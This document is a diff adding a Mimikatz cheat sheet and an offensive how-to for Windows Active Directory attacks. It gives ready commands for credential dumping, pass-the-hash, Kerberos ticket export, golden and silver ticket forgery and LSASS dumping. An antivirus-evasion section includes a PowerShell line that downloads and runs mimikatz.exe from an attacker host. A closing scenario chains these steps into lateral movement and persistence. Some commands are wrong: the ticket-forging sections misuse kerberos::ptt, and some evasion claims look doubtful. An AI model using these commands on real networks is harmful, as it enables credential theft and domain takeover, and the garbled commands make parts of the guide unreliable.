@@ -1,0 +1,203 @@
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+------------------------------------------
+
+mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /hash:<NTLM_HASH> /run:cmd.exe        (Pass the Hass attack)
+
+-------------------------------------------------------------------------------------------------------------------------------------
+
+mimikatz # kerberos::list /export          (dumping kerberos ticket)
+
+----------------------------------------------------------------------
+
+mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-<domain_sid> /rc4:<KRBTGT_HASH> /id:500  (Golden Ticket)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /rc4:<service_account_hash> /service:<service_name> /target:<target_service>
+ (Silver ticket)
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+mimikatz # kerberos::ptt /ticket:<ticket_file>.kirbi
+
+-------------------------------------------------------------------------
+mimikatz # sekurlsa::minidump lsass.dmp  (Dump LSASS memory - Advanced)
+
+----------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+Mimikatz Overview
+
+Mimikatz is a post-exploitation tool that allows attackers to interact with Windows authentication mechanisms. It's primarily used for credential dumping (retrieving passwords and NTLM hashes), pass-the-hash attacks, Kerberos ticket extraction, and more. It's often used after a successful initial compromise, and it's highly effective in Active Directory environments.
+
+1. Credential Dumping
+
+One of Mimikatz's primary features is dumping credentials from memory, such as cleartext passwords, NTLM hashes, and Kerberos tickets.
+
+Command: Dumping Cleartext Passwords
+
+If you have Administrator or SYSTEM privileges on the target, you can use Mimikatz to dump cleartext passwords from memory.
+
+mimikatz # privilege::debug
+mimikatz # sekurlsa::logonpasswords
+
+
+What Happens:
+
+privilege::debug grants Mimikatz the necessary privileges to access memory areas containing authentication information.
+
+sekurlsa::logonpasswords extracts passwords, NTLM hashes, and other authentication data stored in memory.
+
+The output will show you:
+
+Cleartext passwords (if available).
+
+NTLM hashes.
+
+Kerberos tickets (TGT).
+
+Example Output:
+Authentication Id : 0 ; 12345 (0x0000000000003039)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WIN-TARGET
+Logon Server      : WIN-TARGET
+Logon Time        : 9/15/2025 11:27:38 AM
+SID               : S-1-5-21-123456789-9876543210-1122334455-500
+...
+Password          : P@ssw0rd123
+
+2. Pass-the-Hash (PTH) Attack
+
+After you’ve extracted NTLM hashes from memory using the sekurlsa::logonpasswords command, you can perform a Pass-the-Hash (PTH) attack to authenticate to other systems in the network.
+
+Command: Using the NTLM Hash
+mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /hash:<NTLM_HASH> /run:cmd.exe
+
+
+Explanation:
+
+/user: Specifies the username for authentication.
+
+/domain: The domain the user belongs to.
+
+/hash: The NTLM hash of the password.
+
+/run: The command to execute after authenticating (in this case, opening a cmd.exe shell).
+
+This will create a new session using the provided hash and open a command prompt. You can use this session to execute commands or further enumerate the target machine.
+
+3. Dumping Kerberos Tickets
+
+If Kerberos authentication is used (common in Active Directory environments), Mimikatz can extract Kerberos tickets from memory, which can be used for ticket-based attacks (like Pass-the-Ticket).
+
+Command: Dumping Tickets
+mimikatz # kerberos::list /export
+
+
+This will extract all Kerberos tickets (TGTs) from memory and save them in .kirbi files.
+
+You can use these tickets to authenticate to other services that use Kerberos without needing the user’s password.
+
+4. Golden Ticket Attack
+
+A Golden Ticket is a forged Kerberos TGT, and it can be used to authenticate to any service within a domain for a specified period (usually 10 hours by default). Golden tickets are very powerful because they allow you to impersonate any user in the Active Directory domain.
+
+Command: Create a Golden Ticket
+mimikatz # kerberos::ptt /user:Administrator /rc4:<KDC_HASH> /domain:domain.local /sid:S-1-5-21-<domain_sid> /ticket:<ticket_file>.kirbi
+
+
+Explanation:
+
+/user: The user you want to impersonate (e.g., Administrator).
+
+/rc4: The RC4 hash of the KRBTGT account password (this is the account responsible for signing TGTs).
+
+/domain: The domain name.
+
+/sid: The domain SID.
+
+/ticket: The .kirbi file containing the ticket data.
+
+This creates a Golden Ticket, which can then be used to access any system in the domain.
+
+5. Silver Ticket Attack
+
+A Silver Ticket is similar to a Golden Ticket, but it's only valid for a specific service (e.g., a file server or database server). Silver Tickets are created by forging service tickets for a particular service.
+
+Command: Create a Silver Ticket
+mimikatz # kerberos::ptt /user:Administrator /rc4:<KDC_HASH> /domain:domain.local /sid:S-1-5-21-<domain_sid> /service:cifs /target:<target_ip> /ticket:<ticket_file>.kirbi
+
+
+/service: The service to target (e.g., cifs for file shares).
+
+/target: The IP address of the service you're targeting.
+
+6. Dumping and Using LSASS Memory (Advanced)
+
+In some cases, you might need to directly access LSASS (Local Security Authority Subsystem Service) memory to extract credentials. This is more advanced and involves direct memory manipulation.
+
+Command: Dump LSASS Memory
+mimikatz # sekurlsa::minidump lsass.dmp
+
+
+This dumps the LSASS memory to a file, which can then be analyzed offline or transferred to your attack machine for further exploitation.
+
+Running Mimikatz with Admin/SYSTEM Privileges
+
+To interact with sensitive memory areas like LSASS, Mimikatz often requires SYSTEM or Administrator privileges. If you're not already running as SYSTEM, you can use PsExec, WMIC, or other tools to escalate your privileges.
+
+7. Ticking Off the Red Flags (Bypassing AV)
+
+In real-world pentesting, you’ll want to minimize detection. Mimikatz can trigger alarms in antivirus or EDR systems, so there are some techniques to reduce detection.
+
+Common AV Evasion Tactics:
+
+Using PowerShell to run Mimikatz: Many AV products only flag executable binaries. Running Mimikatz directly from PowerShell can sometimes evade detection.
+
+powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://attacker_ip/mimikatz.exe -OutFile C:\\Windows\\Temp\\mimikatz.exe; C:\\Windows\\Temp\\mimikatz.exe"
+
+
+Mimikatz Silent Mode: In some versions, Mimikatz has the -silent flag to suppress verbose output, making it harder to spot in logs.
+
+Disabling AV/EDR via Mimikatz: In some cases, Mimikatz can disable certain AV/EDR defenses temporarily by calling msv1_0::reset.
+
+8. Privilege Escalation and Lateral Movement
+
+Mimikatz can also help with privilege escalation and lateral movement across the network.
+
+Pass-the-Hash: Use the NTLM hashes extracted from one machine to authenticate to other machines on the network.
+
+Kerberos Tickets: Use Golden or Silver Tickets to access other systems without needing the user’s password.
+
+9. Real-World Scenario Example:
+
+Let’s imagine a scenario where you've compromised a workstation in an Active Directory environment. Here’s how you might proceed using Mimikatz:
+
+Extract Credentials:
+After getting Administrator access to a workstation, use Mimikatz to dump cleartext passwords and NTLM hashes.
+
+mimikatz # sekurlsa::logonpasswords
+
+
+Pass-the-Hash:
+With the NTLM hash of the Administrator, use Pass-the-Hash to log into another machine.
+
+mimikatz # sekurlsa::pth /user:Administrator /hash:<NTLM_HASH> /domain:domain.local /run:cmd.exe
+
+
+Move Laterally:
+Use the hash or Kerberos tickets to move laterally and access other systems.
+
+Escalate Privileges:
+If necessary, escalate privileges to SYSTEM using Task Scheduler, PsExec, or Token Impersonation to run Mimikatz with higher privileges.
+
+Create a Golden Ticket:
+Once you have access to Domain Controller hashes (KRBTGT), create a Golden Ticket to stay persistent in the domain.
